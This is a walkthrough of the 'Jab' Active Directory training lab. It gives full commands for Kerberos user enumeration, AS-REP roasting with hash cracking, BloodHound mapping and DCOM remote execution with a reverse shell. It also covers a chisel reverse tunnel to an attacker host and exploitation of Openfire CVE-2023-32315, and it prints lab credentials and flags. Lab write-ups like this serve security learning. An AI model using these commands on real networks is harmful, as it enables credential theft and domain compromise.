Jab - Active Directory Lab Exploitation Walkthrough
===================================================

This is a full exploitation walkthrough for the Jab Active Directory lab. The goal was to gain Domain Admin privileges through Kerberos user enumeration, AS-REP roasting, lateral movement using BloodHound, and remote code execution through Openfire (CVE-2023-32315).

Target Information
------------------
IP Address       : 10.10.11.4  
Domain           : jab.htb  
Domain Controller: dc01.jab.htb  
Key Services     : Kerberos, SMB, LDAP, XMPP/Openfire

Enumeration
-----------
Performed an initial Nmap scan:

nmap -sC -sV -oA nmap 10.10.11.4

Identified ports:
- 88, 389, 636, 445 (Kerberos, LDAP, SMB)
- 5222, 5269, 7070, 7443, 7777 (Openfire/XMPP)

Added to /etc/hosts:

10.10.11.4 jab.htb dc01.jab.htb

Kerberos User Enumeration
-------------------------
Used kerbrute to enumerate valid usernames:

kerbrute userenum --dc dc01.jab.htb -d jab.htb usernames.txt -o kerbrute.txt

AS-REP Roasting
---------------
impacket-GetNPUsers jab.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

Cracked hashes with hashcat:

hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

Recovered credentials:
- jmontgomery : Midnight_121

XMPP Enumeration (Pidgin)
-------------------------
Logged into Openfire chat using Pidgin with cracked credentials. Discovered more users and credentials:

- svc_openfire : !@#$%^&*(1qazxsw)

SMB Access
----------
smbmap -u svc_openfire -p '!@#$%^&*(1qazxsw)' -H 10.10.11.4

Found limited access, but no critical files.

BloodHound & Lateral Movement
-----------------------------
Used bloodhound-python to enumerate AD relationships:

bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw)' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4

Uploaded to BloodHound and found attack path via DCOM privileges.

Remote Code Execution via DCOM
------------------------------
Generated PowerShell payload and used DCOMExec from impacket:

impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw)@dc01.jab.htb' '<powershell-reverse-shell>'

Started listener:

rlwrap nc -nlvp 6658

Captured User Flag:
58b27f9faaec3dfdb2a94dad6a1e2175

Pivot with Chisel
-----------------
Pivoted to access internal Openfire admin interface:

Attacker (listener):
chisel server -p 9999 --reverse

Victim:
chisel client <attacker-ip>:9999 R:9090:127.0.0.1:9090

Accessed Openfire admin at: http://127.0.0.1:9090

Exploitation - CVE-2023-32315
-----------------------------
Cloned exploit repo and uploaded plugin via Openfire admin panel:

git clone https://github.com/miko550/CVE-2023-32315.git  
cd CVE-2023-32315  
pip3 install -r requirements.txt  

Executed RCE and caught reverse shell:

rlwrap nc -nlvp 4444

Captured Root Flag:
8f826f76eb871e0566058e6580760e8e

Summary
-------
- User enum via Kerberos
- AS-REP roasting → credential cracking
- Pivoting through XMPP → BloodHound → DCOM
- Internal access to Openfire admin
- Remote code execution using CVE-2023-32315

Author
------
Farhanahmad Quraishi
